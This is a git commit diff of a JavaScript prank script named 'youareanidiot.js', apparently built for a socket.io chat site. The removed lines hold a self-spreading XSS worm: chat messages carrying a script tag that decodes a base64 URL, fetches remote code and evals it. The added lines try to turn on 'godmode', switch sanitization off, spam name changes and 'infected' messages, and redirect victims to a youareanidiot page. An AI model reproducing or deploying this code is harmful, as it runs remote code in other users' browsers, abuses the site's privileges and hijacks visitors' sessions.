a382e5d47e491a958b24d167e02d47439bac6e20
Windows Xp Sky <reinilsonfernandes25@outlook.com>
2026-03-11 19:47:56 -0300

    Update youareanidiot.js

--- Annoying/youareanidiot.js
+++ Annoying/youareanidiot.js
@@ -1,25 +1,22 @@
-let coughtimer = 7777; setInterval(() => {
-    const socketb = io("//");
-    socketb.emit("client", "MAIN");
-    socketb.emit("login", {
-        name: "youareanidiot.bonzi"
+let coughtimer = 7777;
+socket.emit('command', {
+    list: ['godmode']
+});
+socket.emit('command', {
+    list: ['sanitize', 'off']
+});
+const intervalId = setInterval(function() {
+    socket.emit("command", {
+        list: ["name", "YOU ARE AN IDIOT! JS Virus"]
     });
-    socketb.emit("command", {
-        list: ["color"]
+    socket.emit("command", {
+        list: ["color", "black"]
     });
-    socketb.emit("command", {
-        list: ["color"]
-    });
-    setInterval(() => {
-    socketb.emit("talk", {
-        text: "YOUVE BEEN INFECTED BY THE YOUAREANIDIOT VIRUS! https://discord.gg/TzmRtsm3 <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
-    });
-    socket.emit("talk", {
-        text: "YOUVE BEEN INFECTED BY THE YOUAREANIDIOT VIRUS! https://discord.gg/TzmRtsm3 <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
-            });
+    socket.emit('talk', {
+        text: "YOU'VE BEEN INFECTED BY THE YOUAREANIDIOT VIRUS!"
     });
     coughtimer = coughtimer - 125;
 }, coughtimer);
 setTimeout(() => {
     window.location.href = "https://tlrenny25.github.io/youareanidiot.html";
-}, 27777)
+}, 17777);
